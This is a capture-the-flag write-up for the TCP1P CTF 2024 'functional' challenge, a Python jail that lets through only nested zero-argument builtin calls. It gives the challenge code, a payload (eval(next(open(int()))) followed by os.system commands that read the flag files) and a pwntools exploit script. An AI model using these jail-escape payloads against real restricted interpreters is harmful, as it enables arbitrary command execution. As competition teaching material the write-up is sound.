# TCP1P CTF 2024 functional

Official archive: <https://github.com/TCP1P/TCP1P-CTF-2024-Challenges-Public/tree/main/Misc/functional> or <https://tcp.1pc.tf/games/8/challenges#198-functional>

```python
#!/usr/bin/env python3
import regex
import glob
import sys

exception_groups = (Warning, SystemExit, ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, KeyboardInterrupt, ConnectionError, ResourceWarning, TypeError, BytesWarning, OverflowError, TabError, InterruptedError, RuntimeError, TimeoutError, FileNotFoundError, UserWarning, GeneratorExit, PermissionError, KeyError, AssertionError, UnicodeDecodeError, IsADirectoryError, ZeroDivisionError, FileExistsError, BlockingIOError, SystemError, OSError, EOFError, EncodingWarning, StopIteration, UnicodeWarning, ImportWarning, SyntaxWarning, LookupError, AttributeError, ImportError, ArithmeticError, EnvironmentError, ChildProcessError, UnicodeTranslateError, UnicodeEncodeError, RecursionError, StopAsyncIteration, RuntimeWarning, IndentationError, ValueError, ModuleNotFoundError, DeprecationWarning, BufferError, FutureWarning, ReferenceError, MemoryError, UnicodeError, PendingDeprecationWarning, NotADirectoryError, IOError, FloatingPointError, ProcessLookupError, NameError, NotImplementedError, UnboundLocalError, BrokenPipeError, IndexError)
secret_of_trades = glob.glob('flags/*')

re_pattern = regex.compile(r'[ad-z]+\(((?R)|)\)')
user_input = input('>>> ')

sys.stderr = sys.stdout
sys.stdout = None
sys.stdin = None

if re_pattern.fullmatch(user_input):
    try:
        exec(user_input)
    except exception_groups as e:
        pass
```

The regex `r'[ad-z]+\(((?R)|)\)'` matches:

1. A function name matching `[ad-z]+`
2. Calling the function with no arguments, the argument matches the regex `r'[ad-z]+\(((?R)|)\)'` itself

Therefore, the requirements are: Call functions with zero argument, or return value of another function, and all function names should match `[ad-z]+`.

Print all the builtin functions that are allowed:

```python
import regex
re_pattern = regex.compile(r'[ad-z]+')
print([x for x in __builtins__.__dict__ if re_pattern.fullmatch(x)])
# prints ['all', 'any', 'delattr', 'dir', 'divmod', 'eval', 'format', 'getattr', 'hasattr', 'hash', 'hex', 'id', 'input', 'iter', 'aiter', 'len', 'max', 'min', 'next', 'anext', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'memoryview', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'range', 'reversed', 'set', 'str', 'super', 'tuple', 'type', 'zip', 'open', 'quit', 'exit', 'help']
```

Therefore, we need to use these functions to attack. Inspired by @hmmm's writeup on Discord:

```python
eval(next(open(int())))
exec('import sys,os;sys.stdout=open(1,"w");os.system("cat flags/*")')
```

The attack steps:

1. `open(int())` opens fd 0, which is stdin
2. `next(...)` reads one line from stdin
3. `eval(...)` evals the line

Then, we can freely send code to run. Initially, I tried `os.system("sh")`, but it fails due to `eval(next(open(int())))` opening fd 0 and closing it when the file object freed. In addition, `os.system` is not affected by the chage of `sys.std{in,out,err}`: in fact, the changes to them does not affect the underlying fd, but only affects python code that use them for I/O. And we can replace `import sys` with `__import__('sys')` for it to become an expression to work in `eval` directly.

So the attack script can be simplified:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "functional.py"])
p.recvuntil(b">>> ")
p.sendline("eval(next(open(int())))".encode())
p.sendline("__import__('os').system('')".encode())
p.interactive()
```

Recover the flag via `cat temp | sort -n | awk -F: '{printf "%s",$2;}' | base64 -d`.

Alternatively, we can use reverse shell to get shell.
